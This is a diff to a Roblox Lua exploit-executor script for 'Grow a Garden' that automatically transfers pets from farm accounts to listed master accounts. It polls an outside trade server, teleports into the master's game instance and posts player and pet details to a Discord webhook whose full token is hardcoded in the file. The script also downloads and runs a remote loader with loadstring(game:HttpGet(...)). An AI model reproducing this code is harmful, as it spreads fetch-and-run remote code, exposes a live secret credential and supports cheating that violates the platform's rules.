@@ -2,17 +2,15 @@ repeat task.wait() until game:IsLoaded()
 repeat task.wait() 
     game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game) 
     game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.E, false, game) 
-until game:GetService("Players").LocalPlayer:GetAttribute('DataFullyLoaded') == true
+until game:GetService("Players").LocalPlayer:GetAttribute('DataFullyLoaded')
 
 print('---------------- Executed ----------------')
 
 getgenv().MasterConfig = {
     ['Main'] = { 
-        ['Yutacab0580'] = 'Dragonfly',
-        ['Habadaw4297'] = 'Mimic Octopus',
-        ['Kacayib9284'] = 'Nihonzaru',
-        ['Solopud9293'] = 'Tanuki',
-        ['Guzirij7712'] = 'Kitsune'
+        ['Otgcuvz7358'] = 'Dragonfly',
+        ['Hgfjnnx5470'] = 'Mimic Octopus',
+        ['Cwdlkkb0896'] = 'Kitsune'
     }
 }
 
@@ -20,11 +18,15 @@ local player = game:GetService("Players")
 local repicatestorage = game:GetService("ReplicatedStorage")
 local dataservices = require(repicatestorage.Modules.DataService)
 local httpservices = game:GetService("HttpService")
+local username, target, last_target, toolequip
+local webhook = 'https://discord.com/api/webhooks/1397642896605446225/3YcXOzqeCHJaZ35antAlUFwvvn6WzUVfsZhWc5krRDsGtVgtLFGPHFwam_HUVjjbsSDD'
 
 -- va
-local is_executed = false
-local is_active = false
-local username, target
+
+_G.is_tradeing = false
+_G.is_executed = false
+_G.is_active = false
+_G.is_exit = false
 
 local function interact(path)
     game:GetService("GuiService").SelectedObject = path
@@ -52,6 +54,36 @@ local function ownerPet()
         end
     end
     return nil, nil
+end
+
+local function embed(color, title, description)
+    local embed = {{
+		title = title,
+		description = description,
+		color = color, -- สีเขียวสวย
+		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+		footer = {
+			text = "Grow a Garden Pet Trader System!"
+		}
+	}}
+
+	local payload = {
+		embeds = embed
+	}
+	local jsonData = httpservices:JSONEncode(payload)
+
+	local response = request({
+		Url = webhook,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json",
+			["Content-Length"] = tostring(#jsonData)
+		},
+		Body = jsonData
+	})
+
+    print("Status Code:", response.StatusCode)
+    print("Response Body:", response.Body)
 end
 
 task.spawn(function()
@@ -84,9 +116,9 @@ task.spawn(function()
                         })
                     })
                     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(74.90898132324219, math.random(-60, -50), 190.9416046142578)
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                    is_active = true
-                    _G.Is_Trade = true
+                    -- game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+                    _G.is_active = true
+                    _G.is_tradeing = true
                     if game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification") then
                         interact(game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification").Holder.Frame.Accept)
                     end
@@ -95,10 +127,7 @@ task.spawn(function()
                 while true do task.wait()
                     local x, y = ownerPet()
                     if x and y then
-                        if not _G.target_last then
-                            _G.target_last = x
-                        end
-                        _G.Is_Trade = true
+                        if not last_target then last_target = x end
                         local api = request({
                             Url = "https://trade.zapzone.xyz/get/"..tostring(x),
                             Method = "GET",
@@ -110,10 +139,10 @@ task.spawn(function()
                         if result.Username then -- if username is exist
                             local _timeout = (os.time() - result.LastCall) > 10 or nil
                             if result.JobId == game.JobId and game.Players:FindFirstChild(x) then
-                                _G.Is_Trade = true
-                                is_active = true
-                                local toolequip
-                                for _, v in pairs(workspace.PetsPhysical:GetChildren()) do
+                                print("Found Master!")
+                                _G.is_tradeing = true
+                                _G.is_active = true
+                                for _, v in pairs(workspace.PetsPhysical:GetChildren()) do -- start move up pet
                                     if v then
                                         local owner = v:GetAttribute('OWNER') 
                                         local uuid = v:GetAttribute("UUID")
@@ -135,11 +164,11 @@ task.spawn(function()
                                                         end
                                                     end
                                                 end
-                                            end
+                                            end  
                                         end
                                     end
-                                end
-                                for _, tool in pairs(player.LocalPlayer.Backpack:GetChildren()) do
+                                end -- end move up pet
+                                for _, tool in pairs(player.LocalPlayer.Backpack:GetChildren()) do -- start check pet in backpack
                                     if tool:GetAttribute("ItemType") == "Pet" then
                                         local namepet = tool.Name:gsub("%s%[.*", "")
                                         if namepet == y then
@@ -152,8 +181,8 @@ task.spawn(function()
                                             toolequip = tool.Name
                                         end
                                     end
-                                end
-                                for _, tool in pairs(player.LocalPlayer.Character:GetChildren()) do
+                                end --- end check pet in backpack
+                                for _, tool in pairs(player.LocalPlayer.Character:GetChildren()) do -- start check pet in character
                                     if tool:GetAttribute("ItemType") == "Pet" then
                                         local namepet = tool.Name:gsub("%s%[.*", "")
                                         if namepet == y then
@@ -166,7 +195,7 @@ task.spawn(function()
                                             toolequip = tool.Name
                                         end
                                     end
-                                end
+                                end -- end check pet in character
                                 if toolequip then
                                     local chr = player.LocalPlayer.Character
                                     local bp = player.LocalPlayer.Backpack
@@ -175,8 +204,16 @@ task.spawn(function()
                                         tool = bp:FindFirstChild(toolequip)
                                     elseif chr:FindFirstChild(toolequip) then
                                         tool = chr:FindFirstChild(toolequip)
-                                    end
+                                    end 
                                     if tool then
+        
+                                        embed(0x1abc9c, "Trade Gag", 
+                                        string.format(
+                                            "ผู้เล่น: %s\nรายละเอียด: %s",
+                                            player.LocalPlayer.Name, tostring(tool)
+                                            )
+                                        )
+
                                         print("Equipping:", tool)
                                         chr.Humanoid:EquipTool(tool)
                                         task.wait(1)
@@ -188,47 +225,52 @@ task.spawn(function()
                                         task.wait(5)
                                     else
                                         warn("Tool not found in Backpack or Character!")
-                                    end
-                                elseif toolequip and not game.Players:FindFirstChild(x) then
-                                    print("Not Found Master Active! [2]")
-                                    _timeout = false                                        
+                                    end                                    
                                 end
                             elseif not _timeout and result.Playing < 5 and not game.Players:FindFirstChild(x) then
                                 print(result.JobId, result.Playing, game.JobId)
                                 local success, error = pcall(function()
                                     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, result.JobId, game.Players.LocalPlayer)
                                 end)
-                                is_active = true
-                                _G.Is_Trade = true
-                                if not success then
-                                    task.wait(50)
-                                end
-                                task.wait(10)
+                                _G.is_active = true
+                                _G.is_tradeing = true
+                                task.wait(15)
+                            elseif _timeout and game.Players:FindFirstChild(last_target) then
+                                _G.is_active = false
+                                game:Shutdown()
                             else
-                                print("Master Is TimeOut!")
-                                is_active = false
+                                _G.is_active = false
+                                print("Master Is Bussy!")
                             end
                         else
-                            print("Not Found Master Active! - Continue Farm...")
-                            is_active = false
+                            _G.is_active = false
+                            print("Not Found Master! - Continue Farm...")
                         end
-                    elseif not game.Players:FindFirstChild(tostring(_G.target_last)) or _G.target_last ~= x then
-                        is_active = true
+                    elseif not x and not y and _G.is_active then
                         print("Trade Succes!")
+                        if not _G.is_exit then
+                            embed(0xFF0000, "Trade Gag", 
+                            string.format(
+                                "ผู้เล่น: %s\nรายละเอียด: %s",
+                                player.LocalPlayer.Name, "เทรดเสร็จสิ้น!"
+                                )
+                            )
+                        end
+                        _G.is_active = true
+                        _G.is_exit = true
                         game:Shutdown()
                     else
+                        _G.is_active = false
                         print("Not Pet In Target! - Continue Farm...")
-                        is_active = false
                     end
-                    if not is_active then
-                        task.wait(10)
-                    end
-                    if not is_active and not is_executed then
+                    if not _G.is_active and not _G.is_executed then
                         print("Use Aya Aya Scripts!")
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/Achitsak/zapzone/main/loader/scripts/grow_a_garden.lua"))()
-                        is_executed = true
+                        _G.is_executed = true
                         _G.Is_Trade = false
-                        break
+                    end
+                    if not _G.is_active then
+                        task.wait(10)
                     end
                 end
             end
